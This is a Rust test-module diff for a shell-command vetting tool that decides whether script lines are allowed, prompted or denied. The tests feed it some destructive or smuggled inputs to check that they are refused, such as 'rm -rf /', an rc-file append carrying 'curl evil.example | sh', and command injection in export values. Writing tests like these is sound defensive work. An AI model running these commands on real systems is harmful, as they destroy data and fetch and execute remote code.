             other => panic!("expected allow/print, got {other:?}"),
@@ -1631,7 +2337,7 @@ mod tests {
     fn printf_renders_repeating_format() {
         match verdict(r"printf '%s\n' one two") {
             Allow {
-                action: Action::Print { text },
+                action: Action::Print { text, .. },
                 ..
             } => assert_eq!(text, "one\ntwo\n"),
             other => panic!("expected allow/print, got {other:?}"),
@@ -1654,13 +2360,15 @@ mod tests {
                     Action::Subprocess {
                         name,
                         args,
-                        discard_stderr,
+                        stdout,
+                        stderr,
                     },
                 ..
             } => {
                 assert_eq!(name, "sudo");
                 assert_eq!(args, vec!["make", "install"]);
-                assert!(!discard_stderr);
+                assert_eq!(stdout, StdoutDest::Inherit);
+                assert_eq!(stderr, StderrDest::Inherit);
             }
             other => panic!("expected prompt/subprocess, got {other:?}"),
         }
@@ -1673,7 +2381,7 @@ mod tests {
             ..Config::default()
         };
         assert!(matches!(
-            verdict_with_config("sudo make install", &Session::new(), &config),
+            verdict_with_config("sudo make install", &mut Session::new(), &config),
             Deny { .. }
         ));
     }
@@ -1685,7 +2393,7 @@ mod tests {
             ..Config::default()
         };
         assert!(matches!(
-            verdict_with_config("uname -a", &Session::new(), &config),
+            verdict_with_config("uname -a", &mut Session::new(), &config),
             Allow {
                 action: Action::Subprocess { .. },
                 ..
@@ -1701,7 +2409,7 @@ mod tests {
         };
         config.commands.insert("systemctl".to_string(), Verb::Deny);
         assert!(matches!(
-            verdict_with_config("systemctl enable foo", &Session::new(), &config),
+            verdict_with_config("systemctl enable foo", &mut Session::new(), &config),
             Deny { .. }
         ));
     }
@@ -1711,7 +2419,7 @@ mod tests {
         let mut config = Config::default();
         config.commands.insert("curl".to_string(), Verb::Deny);
         assert!(matches!(
-            verdict_with_config("curl https://example.com", &Session::new(), &config),
+            verdict_with_config("curl https://example.com", &mut Session::new(), &config),
             Deny { .. }
         ));
     }
@@ -1724,7 +2432,7 @@ mod tests {
         };
         config.commands.insert("bash".to_string(), Verb::Allow);
         assert!(matches!(
-            verdict_with_config("bash script.sh", &Session::new(), &config),
+            verdict_with_config("bash script.sh", &mut Session::new(), &config),
             Deny { .. }
         ));
     }
@@ -1736,18 +2444,15 @@ mod tests {
             ..Config::default()
         };
         assert!(matches!(
-            verdict_with_config("cd /tmp", &Session::new(), &config),
-            Deny { .. }
-        ));
-        // `local`/`alias` too: there is no binary to exec, so sending
-        // them to the subprocess tier could only ever fail confusingly
-        // (or, worse, run an unrelated same-named binary on $PATH).
-        assert!(matches!(
-            verdict_with_config("local _has_local", &Session::new(), &config),
+            verdict_with_config("export FOO=bar", &mut Session::new(), &config),
             Deny { .. }
         ));
         assert!(matches!(
-            verdict_with_config("alias local=typeset", &Session::new(), &config),
+            verdict_with_config("eval 'rm -rf /'", &mut Session::new(), &config),
+            Deny { .. }
+        ));
+        assert!(matches!(
+            verdict_with_config("alias local=typeset", &mut Session::new(), &config),
             Deny { .. }
         ));
     }
@@ -1759,7 +2464,7 @@ mod tests {
             ..Config::default()
         };
         assert!(matches!(
-            verdict_with_config("mv a b", &Session::new(), &config),
+            verdict_with_config("mv a b", &mut Session::new(), &config),
             Allow {
                 action: Action::Subprocess { .. },
                 ..
@@ -1774,11 +2479,11 @@ mod tests {
             ..Config::default()
         };
         assert!(matches!(
-            verdict_with_config("curl https://example.com", &Session::new(), &config),
+            verdict_with_config("curl https://example.com", &mut Session::new(), &config),
             Deny { .. }
         ));
         assert!(matches!(
-            verdict_with_config("wget https://example.com", &Session::new(), &config),
+            verdict_with_config("wget https://example.com", &mut Session::new(), &config),
             Deny { .. }
         ));
     }
@@ -1792,7 +2497,7 @@ mod tests {
         assert!(matches!(
             verdict_with_config(
                 "curl -o /etc/hostname https://example.com/x",
-                &Session::new(),
+                &mut Session::new(),
                 &config
             ),
             Allow {
@@ -1811,7 +2516,7 @@ mod tests {
         assert!(matches!(
             verdict_with_config(
                 "curl -o /etc/hostname https://example.com/x",
-                &Session::new(),
+                &mut Session::new(),
                 &config
             ),
             Deny { .. }
@@ -1829,7 +2534,7 @@ mod tests {
         assert!(matches!(
             verdict_with_config(
                 "/tmp/iish-nonexistent-stage2/install.sh --now",
-                &session,
+                &mut session,
                 &config
             ),
             Allow {
@@ -1848,7 +2553,7 @@ mod tests {
     fn allows_rm_of_owned_paths() {
         let mut session = Session::new();
         session.record_created("/tmp/iish-nonexistent/tool-staging");
-        match verdict_with("rm -rf /tmp/iish-nonexistent/tool-staging", &session) {
+        match verdict_with("rm -rf /tmp/iish-nonexistent/tool-staging", &mut session) {
             Allow {
                 action:
                     Action::Remove {
@@ -1871,7 +2576,7 @@ mod tests {
     fn allows_chmod_of_owned_paths() {
         let mut session = Session::new();
         session.record_created("/tmp/iish-nonexistent");
-        match verdict_with("chmod +x /tmp/iish-nonexistent/tool", &session) {
+        match verdict_with("chmod +x /tmp/iish-nonexistent/tool", &mut session) {
             Allow {
                 action:
                     Action::Chmod {
@@ -2026,15 +2731,65 @@ mod tests {
     }
 
     #[test]
-    fn denies_pipelines_generally() {
-        assert!(matches!(verdict("cat foo | grep bar"), Deny { .. }));
+    fn multi_stage_pipelines_produce_a_pipe_verdict() {
+        match verdict("cat foo | grep bar") {
+            Verdict::Pipe { stages } => assert_eq!(stages.len(), 2),
+            other => panic!("expected a pipe verdict, got {other:?}"),
+        }
     }
 
     #[test]
-    fn denies_expansion_of_an_unset_variable() {
+    fn cd_compiles_to_a_native_directory_change() {
         assert!(matches!(
-            verdict("echo $NOT_A_REAL_VARIABLE_IISH_TEST"),
+            verdict("cd /tmp"),
+            Allow {
+                action: Action::ChangeDir { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn unset_variable_expansion_follows_the_nounset_option() {
+        // bash's default: unset expands to empty.
+        match verdict("echo $NOT_A_REAL_VARIABLE_IISH_TEST") {
+            Allow {
+                action: Action::Print { text, .. },
+                ..
+            } => assert_eq!(text, "\n"),
+            other => panic!("expected allow/print, got {other:?}"),
+        }
+        // After the script's own `set -u`, refused instead.
+        let mut session = Session::new();
+        session.set_nounset(true);
+        assert!(matches!(
+            verdict_with("echo $NOT_A_REAL_VARIABLE_IISH_TEST", &mut session),
             Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn set_u_compiles_to_a_nounset_toggle() {
+        assert!(matches!(
+            verdict("set -u"),
+            Allow {
+                action: Action::SetNounset { on: true },
+                ..
+            }
+        ));
+        assert!(matches!(
+            verdict("set +u"),
+            Allow {
+                action: Action::SetNounset { on: false },
+                ..
+            }
+        ));
+        assert!(matches!(
+            verdict("set -o nounset"),
+            Allow {
+                action: Action::SetNounset { on: true },
+                ..
+            }
         ));
     }
 
@@ -2043,7 +2798,7 @@ mod tests {
         let home = std::env::var("HOME").expect("test environment should have $HOME set");
         match verdict("echo $HOME") {
             Allow {
-                action: Action::Print { text },
+                action: Action::Print { text, .. },
                 ..
             } => assert_eq!(text, format!("{home}\n")),
             other => panic!("expected allow/print, got {other:?}"),
@@ -2051,10 +2806,47 @@ mod tests {
     }
 
     #[test]
-    fn denies_unsupported_parameter_expansion_operators() {
-        assert!(matches!(verdict(r#"echo "${FOO:-default}""#), Deny { .. }));
-        assert!(matches!(verdict("echo $1"), Deny { .. }));
-        assert!(matches!(verdict("echo $?"), Deny { .. }));
+    fn default_value_expansion_is_supported_now() {
+        match verdict(r#"echo "${IISH_UNSET_FOR_SURE:-default}""#) {
+            Allow {
+                action: Action::Print { text, .. },
+                ..
+            } => assert_eq!(text, "default\n"),
+            other => panic!("expected allow/print, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn special_parameters_resolve_in_statements() {
+        // `$?` starts at 0.
+        match verdict("echo $?") {
+            Allow {
+                action: Action::Print { text, .. },
+                ..
+            } => assert_eq!(text, "0\n"),
+            other => panic!("expected allow/print, got {other:?}"),
+        }
+        // `$1` with no positional parameters is unset → denied once the
+        // script opts into `set -u`.
+        let mut session = Session::new();
+        session.set_nounset(true);
+        assert!(matches!(verdict_with("echo $1", &mut session), Deny { .. }));
+    }
+
+    #[test]
+    fn pattern_removal_expansion_works() {
+        let mut session = Session::new();
+        session.set_variable("SHELL", "/bin/bash");
+        match verdict_with(
+            r#"echo "${SHELL#*bin}" "${SHELL##*/}" "${SHELL%/*}""#,
+            &mut session,
+        ) {
+            Allow {
+                action: Action::Print { text, .. },
+                ..
+            } => assert_eq!(text, "/bash bash /bin\n"),
+            other => panic!("expected allow/print, got {other:?}"),
+        }
     }
 
     #[test]
@@ -2093,13 +2885,45 @@ mod tests {
     }
 
     #[test]
-    fn remaining_control_flow_is_still_denied_with_specific_reasons() {
-        match verdict("for f in a b; do echo $f; done") {
-            Deny { reason } => assert!(reason.contains("for-loops"), "{reason}"),
-            other => panic!("expected deny, got {other:?}"),
+    fn for_loop_produces_a_for_verdict() {
+        match verdict("for f in a b; do echo x; done") {
+            Verdict::For {
+                variable,
+                values,
+                body,
+            } => {
+                assert_eq!(variable, "f");
+                assert_eq!(values.expect("value words").len(), 2);
+                assert_eq!(body.len(), 1);
+            }
+            other => panic!("expected a for verdict, got {other:?}"),
         }
+    }
+
+    #[test]
+    fn while_and_until_produce_while_verdicts() {
         match verdict("while true; do echo hi; done") {
-            Deny { reason } => assert!(reason.contains("while-loops"), "{reason}"),
+            Verdict::While { until: false, .. } => {}
+            other => panic!("expected a while verdict, got {other:?}"),
+        }
+        match verdict("until true; do echo hi; done") {
+            Verdict::While { until: true, .. } => {}
+            other => panic!("expected an until verdict, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn bang_produces_a_not_verdict_with_the_bang_stripped() {
+        match verdict("! test -d /definitely-not-real") {
+            Verdict::Not { pipeline } => assert!(!pipeline.bang),
+            other => panic!("expected a not verdict, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn subshells_are_still_denied() {
+        match verdict("( echo hi )") {
+            Deny { reason } => assert!(reason.contains("subshells"), "{reason}"),
             other => panic!("expected deny, got {other:?}"),
         }
     }
@@ -2220,7 +3044,9 @@ mod tests {
     }
 
     #[test]
-    fn bare_assignment_of_an_unsupported_value_is_denied() {
+    fn bare_assignment_of_a_refused_substitution_is_denied() {
+        // The test harness's substituter refuses; in a real run this
+        // would execute `uname -s` and capture its output.
         assert!(matches!(verdict("FOO=$(uname -s)"), Deny { .. }));
     }
 
@@ -2238,9 +3064,9 @@ mod tests {
         for (name, value) in assignments {
             session.set_variable(name, value);
         }
-        match verdict_with("echo $FOO", &session) {
+        match verdict_with("echo $FOO", &mut session) {
             Allow {
-                action: Action::Print { text },
+                action: Action::Print { text, .. },
                 ..
             } => assert_eq!(text, "bar\n"),
             other => panic!("expected allow/print, got {other:?}"),
@@ -2306,7 +3132,7 @@ mod tests {
         };
         match verdict_with_config(
             &format!("echo 'source /opt/tool/env.sh' >> {rc}"),
-            &session,
+            &mut session,
             &config,
         ) {
             Allow {
@@ -2332,6 +3158,42 @@ mod tests {
         assert!(matches!(
             verdict(&format!("echo 'rm -rf /' >> {rc}")),
             Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn env_file_append_denies_a_command_smuggled_into_an_assignment_value() {
+        // The value part of an export/PATH line must be a single word:
+        // a `;`, a pipe, or a `$(...)` in it would run as a command when
+        // a later shell sources the rc file — the exact persistence
+        // injection the grammar exists to block.
+        let rc = home_rc(".bashrc");
+        for payload in [
+            "export PATH=x; rm -rf /",
+            "export FOO=$(curl evil.example | sh)",
+            "PATH=/opt/bin && rm -rf ~",
+            "export FOO=`id`",
+        ] {
+            assert!(
+                matches!(verdict(&format!("echo '{payload}' >> {rc}")), Deny { .. }),
+                "expected `{payload}` to be refused"
+            );
+        }
+    }
+
+    #[test]
+    fn env_file_append_still_allows_a_legitimate_path_value() {
+        // The hardening must not break the real idiom: a quoted PATH
+        // value with `:` separators and a `$PATH` reference.
+        let rc = home_rc(".bashrc");
+        assert!(matches!(
+            verdict(&format!(
+                "echo 'export PATH=\"/opt/tool/bin:$PATH\"' >> {rc}"
+            )),
+            Prompt {
+                action: Action::AppendFile { .. },
+                ..
+            }
         ));
     }
 
@@ -2362,7 +3224,7 @@ mod tests {
         assert!(matches!(
             verdict_with_config(
                 &format!("echo 'export FOO=bar' >> {rc}"),
-                &Session::new(),
+                &mut Session::new(),
                 &config
             ),
             Deny { .. }
@@ -2379,7 +3241,7 @@ mod tests {
         assert!(matches!(
             verdict_with_config(
                 &format!("echo 'export FOO=bar' >> {rc}"),
-                &Session::new(),
+                &mut Session::new(),
                 &config
             ),
             Prompt { .. }
@@ -2393,6 +3255,8 @@ mod tests {
             Deny { .. }
         ));
         assert!(matches!(verdict("mkdir /tmp/a 2> /tmp/err"), Deny { .. }));
+        assert!(matches!(verdict("uname -a 2> /tmp/err.log"), Deny { .. }));
+        assert!(matches!(verdict("uname -a 2>> /dev/null"), Deny { .. }));
     }
 
     #[test]
@@ -2401,17 +3265,44 @@ mod tests {
             Prompt {
                 action:
                     Action::Subprocess {
-                        name,
-                        args,
-                        discard_stderr,
+                        name, args, stderr, ..
                     },
                 ..
             } => {
                 assert_eq!(name, "uname");
                 assert_eq!(args, vec!["-a"]);
-                assert!(discard_stderr, "2> /dev/null must reach the subprocess");
+                assert_eq!(
+                    stderr,
+                    StderrDest::Null,
+                    "2> /dev/null must reach the subprocess"
+                );
             }
             other => panic!("expected prompt/subprocess, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn stdout_and_duplicate_redirects_are_recognized() {
+        match verdict("uname -a > /dev/null 2>&1") {
+            Prompt {
+                action: Action::Subprocess { stdout, stderr, .. },
+                ..
+            } => {
+                assert_eq!(stdout, StdoutDest::Null);
+                assert_eq!(stderr, StderrDest::Stdout);
+            }
+            other => panic!("expected prompt/subprocess, got {other:?}"),
+        }
+        match verdict("echo warn >&2") {
+            Allow {
+                action:
+                    Action::Print {
+                        dest: StdoutDest::Stderr,
+                        ..
+                    },
+                ..
+            } => {}
+            other => panic!("expected allow/print-to-stderr, got {other:?}"),
         }
     }
 
@@ -2422,22 +3313,11 @@ mod tests {
         // that its presence must not deny an otherwise fine statement.
         match verdict("echo hi 2> /dev/null") {
             Allow {
-                action: Action::Print { text },
+                action: Action::Print { text, .. },
                 ..
             } => assert_eq!(text, "hi\n"),
             other => panic!("expected allow/print, got {other:?}"),
         }
-    }
-
-    #[test]
-    fn stderr_to_a_real_file_is_denied() {
-        // Only the literal null device qualifies: `2>` onto anything
-        // else is a real write iish would have to vet and doesn't.
-        assert!(matches!(verdict("uname -a 2> /tmp/err.log"), Deny { .. }));
-        // And only fd 2 with `>`: these near-misses stay denied too.
-        assert!(matches!(verdict("uname -a > /dev/null"), Deny { .. }));
-        assert!(matches!(verdict("uname -a 2>> /dev/null"), Deny { .. }));
-        assert!(matches!(verdict("uname -a 2>&1"), Deny { .. }));
     }
 
     #[test]
@@ -2449,7 +3329,10 @@ mod tests {
     fn sha256sum_compute_allows_owned_file() {
         let mut session = Session::new();
         session.record_created("/tmp/iish-nonexistent-dl/tool.tar.gz");
-        match verdict_with("sha256sum /tmp/iish-nonexistent-dl/tool.tar.gz", &session) {
+        match verdict_with(
+            "sha256sum /tmp/iish-nonexistent-dl/tool.tar.gz",
+            &mut session,
+        ) {
             Allow {
                 action: Action::Sha256Sum { paths },
                 ..
@@ -2489,7 +3372,10 @@ mod tests {
         session.record_created(&checklist);
         session.record_created(&target);
 
-        match verdict_with(&format!("sha256sum -c {}", checklist.display()), &session) {
+        match verdict_with(
+            &format!("sha256sum -c {}", checklist.display()),
+            &mut session,
+        ) {
             Allow {
                 action: Action::Sha256Check { entries },
                 ..
@@ -2513,7 +3399,10 @@ mod tests {
         session.record_created(&checklist);
 
         assert!(matches!(
-            verdict_with(&format!("sha256sum -c {}", checklist.display()), &session),
+            verdict_with(
+                &format!("sha256sum -c {}", checklist.display()),
+                &mut session
+            ),
             Deny { .. }
         ));
         std::fs::remove_dir_all(&dir).unwrap();
@@ -2577,7 +3466,7 @@ mod tests {
         assert!(matches!(
             verdict_with(
                 &format!("cp {} {}", src.display(), dest.display()),
-                &session
+                &mut session
             ),
             Allow {
                 action: Action::Copy { .. },
@@ -2634,14 +3523,8 @@ mod tests {
     fn set_known_flags_are_allowed() {
         for line in ["set -e", "set -eu", "set +x", "set -o pipefail", "set -o"] {
             assert!(
-                matches!(
-                    verdict(line),
-                    Allow {
-                        action: Action::Noop,
-                        ..
-                    }
-                ),
-                "expected `{line}` to be allowed as a no-op"
+                matches!(verdict(line), Allow { .. }),
+                "expected `{line}` to be allowed"
             );
         }
     }
@@ -2684,11 +3567,7 @@ mod tests {
         }
     }
 
-    #[test]
-    fn calling_a_defined_function_produces_a_group_verdict() {
-        // Reuse evaluate_function_definition's own compiled action to
-        // get a real function body, rather than constructing a
-        // brush-parser AST node by hand.
+    fn define_greet(session: &mut Session) {
         let def_verdict = verdict("greet() { echo hi; echo bye; }");
         let Allow {
             action: Action::DefineFunction { body, .. },
@@ -2697,12 +3576,173 @@ mod tests {
         else {
             panic!("expected the definition to compile to DefineFunction");
         };
-        let mut session = Session::new();
         session.define_function("greet", body);
+    }
 
-        match verdict_with("greet", &session) {
-            Group { statements } => assert_eq!(statements.len(), 2),
-            other => panic!("expected a group verdict, got {other:?}"),
+    #[test]
+    fn calling_a_defined_function_produces_a_call_verdict_with_args() {
+        let mut session = Session::new();
+        define_greet(&mut session);
+        match verdict_with("greet one 'two words'", &mut session) {
+            Call { name, args, body } => {
+                assert_eq!(name, "greet");
+                assert_eq!(args, vec!["one", "two words"]);
+                assert_eq!(body.len(), 2);
+            }
+            other => panic!("expected a call verdict, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn command_builtin_skips_function_lookup() {
+        let mut session = Session::new();
+        define_greet(&mut session);
+        // `command greet` must NOT dispatch to the function; with no
+        // native/`$PATH` implementation of `greet`, it lands in the
+        // subprocess (ask) tier.
+        assert!(matches!(
+            verdict_with("command greet", &mut session),
+            Prompt {
+                action: Action::Subprocess { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn command_v_compiles_to_a_lookup() {
+        match verdict("command -v git") {
+            Allow {
+                action:
+                    Action::CommandLookup {
+                        name,
+                        style: LookupStyle::CommandV,
+                        ..
+                    },
+                ..
+            } => assert_eq!(name, "git"),
+            other => panic!("expected allow/lookup, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn type_compiles_to_a_lookup() {
+        match verdict("type curl") {
+            Allow {
+                action:
+                    Action::CommandLookup {
+                        name,
+                        style: LookupStyle::Type,
+                        ..
+                    },
+                ..
+            } => assert_eq!(name, "curl"),
+            other => panic!("expected allow/lookup, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn local_inside_a_function_is_allowed() {
+        let mut session = Session::new();
+        session.push_frame("f", vec![]);
+        match verdict_with("local x=1 name", &mut session) {
+            Allow {
+                action: Action::DeclareLocal { assignments },
+                ..
+            } => assert_eq!(
+                assignments,
+                vec![
+                    ("x".to_string(), "1".to_string()),
+                    ("name".to_string(), String::new())
+                ]
+            ),
+            other => panic!("expected allow/declare-local, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn local_outside_a_function_is_denied() {
+        match verdict("local x=1") {
+            Deny { reason } => assert!(reason.contains("outside a function"), "{reason}"),
+            other => panic!("expected deny, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn unset_compiles_variables_and_functions() {
+        match verdict("unset FOO BAR") {
+            Allow {
+                action:
+                    Action::Unset {
+                        names,
+                        functions: false,
+                    },
+                ..
+            } => assert_eq!(names, vec!["FOO", "BAR"]),
+            other => panic!("expected allow/unset, got {other:?}"),
+        }
+        assert!(matches!(
+            verdict("unset -f helper"),
+            Allow {
+                action: Action::Unset {
+                    functions: true,
+                    ..
+                },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn shift_compiles() {
+        assert!(matches!(
+            verdict("shift"),
+            Allow {
+                action: Action::Shift { n: 1 },
+                ..
+            }
+        ));
+        assert!(matches!(
+            verdict("shift 2"),
+            Allow {
+                action: Action::Shift { n: 2 },
+                ..
+            }
+        ));
+        assert!(matches!(verdict("shift x"), Deny { .. }));
+    }
+
+    #[test]
+    fn return_requires_a_function_and_exit_does_not() {
+        assert!(matches!(verdict("return 1"), Deny { .. }));
+        let mut session = Session::new();
+        session.push_frame("f", vec![]);
+        assert!(matches!(
+            verdict_with("return 1", &mut session),
+            Verdict::ControlFlow(Flow::Return(1))
+        ));
+        assert!(matches!(
+            verdict("exit 3"),
+            Verdict::ControlFlow(Flow::Exit(3))
+        ));
+        assert!(matches!(
+            verdict("break"),
+            Verdict::ControlFlow(Flow::Break(1))
+        ));
+        assert!(matches!(
+            verdict("continue 2"),
+            Verdict::ControlFlow(Flow::Continue(2))
+        ));
+    }
+
+    #[test]
+    fn function_args_expand_at_and_star_by_field() {
+        let mut session = Session::new();
+        define_greet(&mut session);
+        session.push_frame("outer", vec!["a".into(), "b c".into()]);
+        match verdict_with("greet \"$@\"", &mut session) {
+            Call { args, .. } => assert_eq!(args, vec!["a", "b c"]),
+            other => panic!("expected a call verdict, got {other:?}"),
         }
     }
 }
